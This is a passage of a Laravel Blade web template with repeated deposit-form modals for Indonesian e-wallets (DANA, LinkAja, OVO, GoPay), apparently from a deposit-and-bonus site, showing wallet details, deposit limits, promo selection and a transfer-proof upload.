                                                                                            <td class="col-xs-12 col-md-6"
                                                                                                colspan="2"
                                                                                                style="padding-bottom: 10px;">
                                                                                                <input id="info-copy-2"
                                                                                                    value="8205506752"
                                                                                                    class="copy-input">

                                                                                                <a href="javascript:void(0);"
                                                                                                    data-sel="info-copy-2"
                                                                                                    class="btn btn-link btn-copy lbl">
                                                                                                    <span
                                                                                                        style="white-space: normal; word-break: break-word;">SCAN BARCODE QR
                                                                                                    </span>
                                                                                                    <i
                                                                                                        class="icon-copy"></i>
                                                                                                </a>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td class="col-xs-6 col-md-6">
                                                                                                <small>Min Deposit</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">
                                                                                                <span class="lbl"
                                                                                                    id="min_modal_dana">
                                                                                                    IDR50,000.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2">
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 ">
                                                                                                <small i18n="">Max
                                                                                                    Deposit</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right ">
                                                                                                <span class="lbl">
                                                                                                    IDR1,000,000,000.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td
                                                                                                class="col-xs-6  col-md-6 ">
                                                                                                <small
                                                                                                    i18n="">Komisi
                                                                                                    Bank / Transaksi</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">

                                                                                                <span class="lbl">
                                                                                                    IDR 0.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td
                                                                                                class="col-xs-6  col-md-6 ">
                                                                                                <small
                                                                                                    i18n="">Subsidi
                                                                                                    Bank / Transaksi</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">
                                                                                                <span class="lbl">
                                                                                                    IDR 0
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                    </tbody>
                                                                                </table>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4">
                                                                            <div class="font-weight-bold">
                                                                                Bonus </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <div class="m-15" style="width: 100%;">
                                                                                <div style="width: 100%;">
                                                                                    <select class="form-control promoList"
                                                                                         id="pilih_promo_dana" 
                                                                                        name="bonus_id">
                                                                                        <option disabled selected
                                                                                            value="0">Pilih promo
                                                                                            tersedia</option>
                                                                                        @foreach ($bonus as $b)
                                                                                            <option
                                                                                                value="{{ $b->id }}"
                                                                                                
                                                                                                data-persentase="{{ $b->nominal }}">
                                                                                                {{ $b->keterangan }}
                                                                                                <!--
                                                                                                    data-min="@currency($b->minimal)"
                                                                                                data-minin="{{ $b->minimal }}"
                                                                                                 Minimal Transaksi:
                                                                                                @currency($b->minimal) -->
                                                                                            </option>
                                                                                        @endforeach
                                                                                    </select>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4 ">
                                                                            <div class="font-weight-bold">
                                                                                Jumlah Deposit<span
                                                                                    class="text-danger">*</span>
                                                                            </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8">
                                                                            <div class=" d-flex flex-wrap">
                                                                                <input type="text" id="min_in_dana"
                                                                                    class="form-control m-15 price-tag"
                                                                                    placeholder="Masukan Nominal Deposit"
                                                                                    name="nominal" min="50000"
                                                                                    required>
                                                                            </div>
                                                                            <p class="min-max-notes">
                                                                                Min Claim Bonus<span
                                                                                    class="min-deposit-amount"
                                                                                    style="padding-right: 5px;"><b
                                                                                        id="min_dana">
                                                                                        100,000.00</b></span><br>
                                                                                Max Claim Bonus<span
                                                                                    class="max-deposit-amount"><b>
                                                                                        10,000,000.00</b></span>
                                                                            </p>
                                                                            <div class=" d-flex flex-wrap">
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4  ">
                                                                            <div class="font-weight-bold">
                                                                                Keterangan </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <input type="text" required
                                                                                class="form-control m-15" id="ref_no"
                                                                                maxlength="35" minlength="5"
                                                                                name="keterangan"
                                                                                placeholder="No. Referensi / Nama Pengirim">
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4 ">
                                                                            <div class="font-weight-bold">
                                                                                Bukti Transfer </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <div class="file-drop-area m-15">
                                                                                <span class="btn btn-secondary "
                                                                                    i18n="">Pilih File</span>
                                                                                <span class="file-msg">
                                                                                    Bukti Transfer
                                                                                </span>
                                                                                <input class="file-input"
                                                                                    name="bukti_transfer" 
                                                                                    id="receipt" type="file"
                                                                                    accept="image/png, image/jpg, image/jpeg">
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-12 d-flex flex-wrap">
                                                                            <label>
                                                                                <input type="checkbox" required
                                                                                    class="form-check-input"
                                                                                    id="exampleCheck1"
                                                                                    name="termcondition">
                                                                                Saya telah membaca dan menyetujui Syarat dan Selalu pastikan rekening pengirim atau rekening tujuan sesuai dengan data yang terdaftar pada menu Form Deposit Situs.

                                        Kami tidak memberikan toleransi apabila terjadi kesalahan pengiriman uang (Deposit) ke rekening yang bukan rekening SITUS kami.

                                        Transfer wajib memakai kode unik 888, Contoh 100.888.
                                                                                Harap melakukan konfirmasi deposit 1x saja, dan tunggu permohonan anda diproses untuk dapat melakukan deposit selanjutnya.
                                                                            </label>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <!--- second Tab end----->
                                                                <div class="row d-flex">
                                                                    <div class="col-md-3 col-xs-4  ">
                                                                    </div>
                                                                    <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                        <div class="m-15">
                                                                            <button type="button"
                                                                                class="btn btn-primary" id="backBtn"
                                                                                onclick="tutup_bank()">Back</button>

                                                                            <button type="submit"
                                                                                class="btn btn-secondary"
                                                                                id="submitBtn">Deposit</button>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </form>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <div id="modal_linkaja" style="display: none">
                                        <div class="box-wrapper plr-15">
                                            <div class="container-b3">
                                                <div class="row">
                                                    <div class="col-xs-12 col-md-12 content-form">
                                                        <style>
                                                            * {
                                                                -webkit-backface-visibility: visible;
                                                            }

                                                            select>option.disble {
                                                                background-color: #d4d4d4;
                                                            }
                                                        </style>
                                                        <form id="depositForm" class="needs-validation depositFormLink"
                                                            action="{{ URL::to('user-deposit') }}" method="POST"
                                                            enctype="multipart/form-data">
                                                            @csrf
                                                            <input type="hidden" name="type" value="1">
                                                            <input type="hidden" name="status" value="1">
                                                            <input type="hidden" name="bank_id" value="6">
                                                            <input type="hidden" name="bonus_persentase"
                                                                id="bonus_persentase_linkaja">
                                                            <div class="box-wrapper plr-15">
                                                                <div class="row d-flex">
                                                                    <div class="col-md-3 col-xs-4  ">
                                                                        <div class="font-weight-bold">
                                                                            Metode Penyetoran<span
                                                                                class="text-danger">*</span>
                                                                        </div>
                                                                    </div>
                                                                    <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                        <div class="radio_2 m-15 mt-2">
                                                                            <input id="radioBank5" checked=""
                                                                                type="radio" value="5">
                                                                            <label class=" " for="radioBank5">
                                                                                <span class="radio-title">
                                                                                    LINKAJA </span>
                                                                                <span class="marked">
                                                                                    <i class="icon-checkmark"></i>
                                                                                </span>
                                                                            </label>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="tab">
                                                                    
                                                                    <div class="row  info-lst" id="bankInfo_de001"
                                                                        style="">
                                                                        <div class="col-md-3">
                                                                            <div class="qrcode"></div>
                                                                        </div>
                                                                        <div class="col-xs-12 col-md-9 ">
                                                                            <div class="bankInfo-box" id="bankList">
                                                                                <div class="box-title">
                                                                                    <i class="icon-invoice i-invoice"></i>
                                                                                    Rincian Deposit Akun
                                                                                    <div class="pull-right acc_status">
                                                                                        STATUS :
                                                                                        <span
                                                                                            class="text-success">ONLINE</span>
                                                                                    </div>
                                                                                </div>
                                                                                <?php
                                                                                if(!empty($dana->image_qr)){
                                                                                    ?>
                                                                                    <!-- <img src="{{ asset('storage/logo/' . $dana->image_qr) }}" alt="" class="img_qr"> -->
                                                                                    <?php
                                                                                }
                                                                                ?>
                                                                                <table
                                                                                    class="table table-borderless   text-right info-box--001">
                                                                                    <tbody>
                                                                                        <td colspan="2" style="padding-bottom:10px">
                                                                                            <img src="https://i.ibb.co.com/7NB4kcLd/warkopgaulv212.jpg" alt="" style="display:block; margin:auto; height: 200px;">
                                                                                        </td>
                                                                                        <tr class="text-left first">
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <small>
                                                                                                    Nama Akun bank </small>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <input id="info-copy-1"
                                                                                                    value="{{ $linkaja->nama_penerima }}"
                                                                                                    class="copy-input">

                                                                                                <a href="javascript:void(0);"
                                                                                                    data-sel="info-copy-1"
                                                                                                    class="btn btn-link btn-copy lbl">
                                                                                                    <span class=" ">WARKOP GAUL
                                                                                                    </span>
                                                                                                    <i
                                                                                                        class="icon-copy"></i>
                                                                                                </a>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left first">
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <small>
                                                                                                    No. Wallet / ACCT
                                                                                                </small>
                                                                                            </td>
                                                                                        </tr>

                                                                                        <tr>
                                                                                            <td class="col-xs-12 col-md-6"
                                                                                                colspan="2"
                                                                                                style="padding-bottom: 10px;">
                                                                                                <input id="info-copy-2"
                                                                                                    value="8205506752"
                                                                                                    class="copy-input">

                                                                                                <a href="javascript:void(0);"
                                                                                                    data-sel="info-copy-2"
                                                                                                    class="btn btn-link btn-copy lbl">
                                                                                                    <span
                                                                                                        style="white-space: normal; word-break: break-word;">SCAN BARCODE QR
                                                                                                    </span>
                                                                                                    <i
                                                                                                        class="icon-copy"></i>
                                                                                                </a>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td class="col-xs-6 col-md-6">
                                                                                                <small>Min Deposit</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">
                                                                                                <span class="lbl"
                                                                                                    id="min_modal_linkaja">
                                                                                                    IDR50,000.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2">
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 ">
                                                                                                <small i18n="">Max
                                                                                                    Deposit</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right ">
                                                                                                <span class="lbl">
                                                                                                    IDR1,000,000,000.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td
                                                                                                class="col-xs-6  col-md-6 ">
                                                                                                <small
                                                                                                    i18n="">Komisi
                                                                                                    Bank / Transaksi</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">

                                                                                                <span class="lbl">
                                                                                                    IDR 0.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td
                                                                                                class="col-xs-6  col-md-6 ">
                                                                                                <small
                                                                                                    i18n="">Subsidi
                                                                                                    Bank / Transaksi</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">
                                                                                                <span class="lbl">
                                                                                                    IDR 0
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                    </tbody>
                                                                                </table>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4">
                                                                            <div class="font-weight-bold">
                                                                                Bonus </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <div class="m-15" style="width: 100%;">
                                                                                <div style="width: 100%;">
                                                                                    <select class="form-control promoList"
                                                                                         id="pilih_promo_linkaja"
                                                                                        name="bonus_id">
                                                                                        <option disabled selected
                                                                                            value="0">Pilih promo
                                                                                            tersedia</option>
                                                                                        @foreach ($bonus as $b)
                                                                                            <option
                                                                                                value="{{ $b->id }}"
                                                                                               
                                                                                                data-persentase="{{ $b->nominal }}">
                                                                                                {{ $b->keterangan }}
                                                                                                <!-- data-min="@currency($b->minimal)"
                                                                                                data-minin="{{ $b->minimal }}" 
                                                                                                    Minimal Transaksi:
                                                                                                @currency($b->minimal) -->
                                                                                            </option>
                                                                                        @endforeach
                                                                                    </select>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4 ">
                                                                            <div class="font-weight-bold">
                                                                                Jumlah Deposit<span
                                                                                    class="text-danger">*</span>
                                                                            </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8">
                                                                            <div class=" d-flex flex-wrap">
                                                                                <input type="text"
                                                                                    id="min_in_linkaja"
                                                                                    class="form-control m-15 price-tag"
                                                                                    placeholder="Masukan Nominal Deposit"
                                                                                    name="nominal" min="10000"
                                                                                    required>
                                                                            </div>
                                                                            <p class="min-max-notes">
                                                                                Min Claim Bonus<span
                                                                                    class="min-deposit-amount"
                                                                                    style="padding-right: 5px;"><b
                                                                                        id="min_linkaja">
                                                                                        100,000.00</b></span><br>
                                                                                Max Claim Bonus<span
                                                                                    class="max-deposit-amount"><b>
                                                                                        10,000,000.00</b></span>
                                                                            </p>
                                                                            <div class=" d-flex flex-wrap">
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4  ">
                                                                            <div class="font-weight-bold">
                                                                                Keterangan </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <input type="text" required
                                                                                class="form-control m-15" id="ref_no"
                                                                                maxlength="35" minlength="5"
                                                                                name="keterangan"
                                                                                placeholder="No. Referensi / Nama Pengirim">
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4 ">
                                                                            <div class="font-weight-bold">
                                                                                Bukti Transfer </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <div class="file-drop-area m-15">
                                                                                <span class="btn btn-secondary "
                                                                                    i18n="">Pilih File</span>
                                                                                <span class="file-msg">
                                                                                    Bukti Transfer
                                                                                </span>
                                                                                <input class="file-input"
                                                                                    name="bukti_transfer" 
                                                                                    id="receipt" type="file"
                                                                                    accept="image/png, image/jpg, image/jpeg">
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-12 d-flex flex-wrap">
                                                                            <label>
                                                                                <input type="checkbox"
                                                                                    class="form-check-input"
                                                                                    id="exampleCheck1"
                                                                                    name="termcondition">
                                                                                Saya telah membaca dan menyetujui Syarat dan Selalu pastikan rekening pengirim atau rekening tujuan sesuai dengan data yang terdaftar pada menu Form Deposit Situs.

                                        Kami tidak memberikan toleransi apabila terjadi kesalahan pengiriman uang (Deposit) ke rekening yang bukan rekening SITUS kami.

                                        Transfer wajib memakai kode unik 888, Contoh 100.888.
                                                                                Harap melakukan konfirmasi deposit 1x saja, dan tunggu permohonan anda diproses untuk dapat melakukan deposit selanjutnya.
                                                                            </label>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <!--- second Tab end----->
                                                                <div class="row d-flex">
                                                                    <div class="col-md-3 col-xs-4  ">
                                                                    </div>
                                                                    <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                        <div class="m-15">
                                                                            <button type="button"
                                                                                class="btn btn-primary" id="backBtn"
                                                                                onclick="tutup_bank()">Back</button>

                                                                            <button type="submit"
                                                                                class="btn btn-secondary"
                                                                                id="submitBtn">Deposit</button>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </form>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <div id="modal_ovo" style="display: none">
                                        <div class="box-wrapper plr-15">
                                            <div class="container-b3">
                                                <div class="row">
                                                    <div class="col-xs-12 col-md-12 content-form">
                                                        <style>
                                                            * {
                                                                -webkit-backface-visibility: visible;
                                                            }

                                                            select>option.disble {
                                                                background-color: #d4d4d4;
                                                            }
                                                        </style>
                                                        <form id="depositForm" class="needs-validation depositFormOvo"
                                                            action="{{ URL::to('user-deposit') }}" method="POST"
                                                            enctype="multipart/form-data">
                                                            @csrf
                                                            <input type="hidden" name="type" value="1">
                                                            <input type="hidden" name="status" value="1">
                                                            <input type="hidden" name="bank_id" value="7">
                                                            <input type="hidden" name="bonus_persentase"
                                                                id="bonus_persentase_ovo">
                                                            <div class="box-wrapper plr-15">
                                                                <div class="row d-flex">
                                                                    <div class="col-md-3 col-xs-4  ">
                                                                        <div class="font-weight-bold">
                                                                            Metode Penyetoran<span
                                                                                class="text-danger">*</span>
                                                                        </div>
                                                                    </div>
                                                                    <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                        <div class="radio_2 m-15 mt-2">
                                                                            <input id="radioBank5" checked=""
                                                                                type="radio" value="5">
                                                                            <label class=" " for="radioBank5">
                                                                                <span class="radio-title">
                                                                                    OVO </span>
                                                                                <span class="marked">
                                                                                    <i class="icon-checkmark"></i>
                                                                                </span>
                                                                            </label>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="tab">
                                                                    
                                                                    <div class="row  info-lst" id="bankInfo_de001"
                                                                        style="">
                                                                        <div class="col-md-3">
                                                                            <div class="qrcode"></div>
                                                                        </div>
                                                                        <div class="col-xs-12 col-md-9 ">
                                                                            <div class="bankInfo-box" id="bankList">
                                                                                <div class="box-title">
                                                                                    <i class="icon-invoice i-invoice"></i>
                                                                                    Rincian Deposit Akun
                                                                                    <div class="pull-right acc_status">
                                                                                        STATUS :
                                                                                        <span
                                                                                            class="text-success">ONLINE</span>
                                                                                    </div>
                                                                                </div>
                                                                                <?php
                                                                                if(!empty($dana->image_qr)){
                                                                                    ?>
                                                                                    <!-- <img src="{{ asset('storage/logo/' . $dana->image_qr) }}" alt="" class="img_qr"> -->
                                                                                    <?php
                                                                                }
                                                                                ?>
                                                                                <table
                                                                                    class="table table-borderless   text-right info-box--001">
                                                                                    <tbody>
                                                                                        <td colspan="2" style="padding-bottom:10px">
                                                                                            <img src="https://i.ibb.co.com/7NB4kcLd/warkopgaulv212.jpg" alt="" style="display:block; margin:auto; height: 200px;">
                                                                                        </td>
                                                                                        <tr class="text-left first">
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <small>
                                                                                                    Nama Akun bank </small>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <input id="info-copy-1"
                                                                                                    value="{{ $linkaja->nama_penerima }}"
                                                                                                    class="copy-input">

                                                                                                <a href="javascript:void(0);"
                                                                                                    data-sel="info-copy-1"
                                                                                                    class="btn btn-link btn-copy lbl">
                                                                                                    <span class=" ">WARKOP GAUL
                                                                                                    </span>
                                                                                                    <i
                                                                                                        class="icon-copy"></i>
                                                                                                </a>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left first">
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <small>
                                                                                                    No. Wallet / ACCT
                                                                                                </small>
                                                                                            </td>
                                                                                        </tr>

                                                                                        <tr>
                                                                                            <td class="col-xs-12 col-md-6"
                                                                                                colspan="2"
                                                                                                style="padding-bottom: 10px;">
                                                                                                <input id="info-copy-2"
                                                                                                    value="8205506752"
                                                                                                    class="copy-input">

                                                                                                <a href="javascript:void(0);"
                                                                                                    data-sel="info-copy-2"
                                                                                                    class="btn btn-link btn-copy lbl">
                                                                                                    <span
                                                                                                        style="white-space: normal; word-break: break-word;">SCAN BARCODE QR
                                                                                                    </span>
                                                                                                    <i
                                                                                                        class="icon-copy"></i>
                                                                                                </a>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td class="col-xs-6 col-md-6">
                                                                                                <small>Min Deposit</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">
                                                                                                <span class="lbl"
                                                                                                    id="min_modal_ovo">
                                                                                                    IDR50,000.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2">
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 ">
                                                                                                <small i18n="">Max
                                                                                                    Deposit</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right ">
                                                                                                <span class="lbl">
                                                                                                    IDR1,000,000,000.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td
                                                                                                class="col-xs-6  col-md-6 ">
                                                                                                <small
                                                                                                    i18n="">Komisi
                                                                                                    Bank / Transaksi</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">

                                                                                                <span class="lbl">
                                                                                                    IDR 0.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td
                                                                                                class="col-xs-6  col-md-6 ">
                                                                                                <small
                                                                                                    i18n="">Subsidi
                                                                                                    Bank / Transaksi</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">
                                                                                                <span class="lbl">
                                                                                                    IDR 0
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                    </tbody>
                                                                                </table>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4">
                                                                            <div class="font-weight-bold">
                                                                                Bonus </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <div class="m-15" style="width: 100%;">
                                                                                <div style="width: 100%;">
                                                                                    <select class="form-control promoList"
                                                                                         id="pilih_promo_ovo"
                                                                                        name="bonus_id">
                                                                                        <option disabled selected
                                                                                            value="0">Pilih promo
                                                                                            tersedia</option>
                                                                                        @foreach ($bonus as $b)
                                                                                            <option
                                                                                                value="{{ $b->id }}"
                                                                                                
                                                                                                data-persentase="{{ $b->nominal }}">
                                                                                                {{ $b->keterangan }}
                                                                                                <!-- data-min="@currency($b->minimal)"
                                                                                                data-minin="{{ $b->minimal }}"
                                                                                                    Minimal Transaksi:
                                                                                                @currency($b->minimal) -->
                                                                                            </option>
                                                                                        @endforeach
                                                                                    </select>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4 ">
                                                                            <div class="font-weight-bold">
                                                                                Jumlah Deposit<span
                                                                                    class="text-danger">*</span>
                                                                            </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8">
                                                                            <div class=" d-flex flex-wrap">
                                                                                <input type="text" id="min_in_ovo"
                                                                                    class="form-control m-15 price-tag"
                                                                                    placeholder="Masukan Nominal Deposit"
                                                                                    name="nominal" min="10000"
                                                                                    required>
                                                                            </div>
                                                                            <p class="min-max-notes">
                                                                                Min Claim Bonus<span
                                                                                    class="min-deposit-amount"
                                                                                    style="padding-right: 5px;"><b
                                                                                        id="min_ovo">
                                                                                        100,000.00</b></span><br>
                                                                                Max Claim Bonus<span
                                                                                    class="max-deposit-amount"><b>
                                                                                        10,000,000.00</b></span>
                                                                            </p>
                                                                            <div class=" d-flex flex-wrap">
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4  ">
                                                                            <div class="font-weight-bold">
                                                                                Keterangan </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <input type="text" required
                                                                                class="form-control m-15" id="ref_no"
                                                                                maxlength="35" minlength="5"
                                                                                name="keterangan"
                                                                                placeholder="No. Referensi / Nama Pengirim">
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4 ">
                                                                            <div class="font-weight-bold">
                                                                                Bukti Transfer </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <div class="file-drop-area m-15">
                                                                                <span class="btn btn-secondary "
                                                                                    i18n="">Pilih File</span>
                                                                                <span class="file-msg">
                                                                                    Bukti Transfer
                                                                                </span>
                                                                                <input class="file-input"
                                                                                    name="bukti_transfer" 
                                                                                    id="receipt" type="file"
                                                                                    accept="image/png, image/jpg, image/jpeg">
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-12 d-flex flex-wrap">
                                                                            <label>
                                                                                <input type="checkbox"
                                                                                    class="form-check-input"
                                                                                    id="exampleCheck1"
                                                                                    name="termcondition">
                                                                                Saya telah membaca dan menyetujui Syarat dan Selalu pastikan rekening pengirim atau rekening tujuan sesuai dengan data yang terdaftar pada menu Form Deposit Situs.

                                        Kami tidak memberikan toleransi apabila terjadi kesalahan pengiriman uang (Deposit) ke rekening yang bukan rekening SITUS kami.

                                        Transfer wajib memakai kode unik 888, Contoh 100.888.
                                                                                Harap melakukan konfirmasi deposit 1x saja, dan tunggu permohonan anda diproses untuk dapat melakukan deposit selanjutnya.
                                                                            </label>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <!--- second Tab end----->
                                                                <div class="row d-flex">
                                                                    <div class="col-md-3 col-xs-4  ">
                                                                    </div>
                                                                    <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                        <div class="m-15">
                                                                            <button type="button"
                                                                                class="btn btn-primary" id="backBtn"
                                                                                onclick="tutup_bank()">Back</button>

                                                                            <button type="submit"
                                                                                class="btn btn-secondary"
                                                                                id="submitBtn">Deposit</button>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </form>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <div id="modal_gopay" style="display: none">
                                        <div class="box-wrapper plr-15">
                                            <div class="container-b3">
                                                <div class="row">
                                                    <div class="col-xs-12 col-md-12 content-form">
                                                        <style>
                                                            * {
                                                                -webkit-backface-visibility: visible;
                                                            }

                                                            select>option.disble {
                                                                background-color: #d4d4d4;
                                                            }
                                                        </style>
                                                        <form id="depositForm" class="needs-validation depositFormGopay"
                                                            action="{{ URL::to('user-deposit') }}" method="POST"
                                                            enctype="multipart/form-data">
                                                            @csrf
                                                            <input type="hidden" name="type" value="1">
                                                            <input type="hidden" name="status" value="1">
                                                            <input type="hidden" name="bank_id" value="8">
                                                            <input type="hidden" name="bonus_persentase"
                                                                id="bonus_persentase_gopay">
                                                            <div class="box-wrapper plr-15">
                                                                <div class="row d-flex">
                                                                    <div class="col-md-3 col-xs-4  ">
                                                                        <div class="font-weight-bold">
                                                                            Metode Penyetoran<span
                                                                                class="text-danger">*</span>
                                                                        </div>
                                                                    </div>
                                                                    <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                        <div class="radio_2 m-15 mt-2">
                                                                            <input id="radioBank5" checked=""
                                                                                type="radio" value="5">
                                                                            <label class=" " for="radioBank5">
                                                                                <span class="radio-title">
                                                                                    GOPAY </span>
                                                                                <span class="marked">
                                                                                    <i class="icon-checkmark"></i>
                                                                                </span>
                                                                            </label>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="tab">
                                                                    
                                                                    <div class="row  info-lst" id="bankInfo_de001"
                                                                        style="">
                                                                        <div class="col-md-3">
                                                                            <div class="qrcode"></div>
                                                                        </div>
                                                                        <div class="col-xs-12 col-md-9 ">
                                                                            <div class="bankInfo-box" id="bankList">
                                                                                <div class="box-title">
                                                                                    <i class="icon-invoice i-invoice"></i>
                                                                                    Rincian Deposit Akun
                                                                                    <div class="pull-right acc_status">
                                                                                        STATUS :
                                                                                        <span
                                                                                            class="text-success">ONLINE</span>
                                                                                    </div>
                                                                                </div>
                                                                                <?php
                                                                                if(!empty($dana->image_qr)){
                                                                                    ?>
                                                                                    <!-- <img src="{{ asset('storage/logo/' . $dana->image_qr) }}" alt="" class="img_qr"> -->
                                                                                    <?php
                                                                                }
                                                                                ?>
                                                                                <table
                                                                                    class="table table-borderless   text-right info-box--001">
                                                                                    <tbody>
                                                                                        <td colspan="2" style="padding-bottom:10px">
                                                                                            <img src="https://i.ibb.co.com/7NB4kcLd/warkopgaulv212.jpg" alt="" style="display:block; margin:auto; height: 200px;">
                                                                                        </td>
                                                                                        <tr class="text-left first">
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <small>
